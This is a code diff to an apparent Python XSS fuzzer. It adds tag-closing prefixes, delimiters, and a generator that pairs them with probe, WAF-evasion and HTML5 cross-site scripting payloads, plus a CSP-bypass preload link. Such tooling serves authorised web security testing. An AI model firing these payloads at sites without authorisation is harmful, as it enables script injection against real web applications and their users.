@@ -319,6 +319,14 @@ _reg_payloads = [
     "<d|3v ",
 ]
 
+_close_payloads = [
+    '\n',
+    '-->',
+    '</div>',
+    '">',
+    "'>",
+]
+
 # payload for waf test
 _waf_payloads = [
     "<IMG SRC=JaVaScRiPt:alert('xss')>",
@@ -391,12 +399,29 @@ class XSS(Fuzzer):
 
     """generate XSS payload"""
 
+    delimiter = [
+        " ",
+        "\x09",
+        "\x09\x09",
+        "/",
+        "\x0a",
+        "\x0d",
+        "/~/",
+    ]
+    ending = [
+        ">",
+        "//",
+        " ",
+        "\t",
+        "\n",
+    ]
     jsglobals = _globals
     tags = _tags
     events = _events
     htmlTemplate = _htmlTemplate
     probes = _probes
     payloads = _payloads
+    close_payloads = _close_payloads
     reg_payloads = _reg_payloads
     waf_payloads = _waf_payloads
     h5payloads = _h5payloads
@@ -453,20 +478,6 @@ class XSS(Fuzzer):
 
     @classmethod
     def template(cls, tag="img", delimiter=" ", event_handler="onerror", javascript="alert(/xss/)", ending=">"):
-        '''
-        delimiter " "
-        delimiter "\x09"
-        delimiter "\x09\x09"
-        delimiter "/"
-        delimiter "\x0a"
-        delimiter "\x0d"
-        delimiter "/~/"
-        ending ">"
-        ending "//"
-        ending " "
-        ending "\t"
-        ending "\n"
-        '''
         return f"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}"
 
     def script(self):
@@ -482,3 +493,22 @@ class XSS(Fuzzer):
 
     def cspBypass(self):
         return "<link rel='preload' href='%s'>" % self.url
+
+    def closeTag(self):
+        for p in self.close_payloads:
+            yield p
+
+    def allpayloads(self):
+        for p in self.probes:
+            yield p
+        for p in self.payloads:
+            yield p
+        for p in self.waf_payloads:
+            yield p
+        for p in self.h5payloads:
+            yield p
+
+    def fuzz(self):
+        for prefix in self.closeTag():
+            for p in self.allpayloads():
+                yield prefix + p
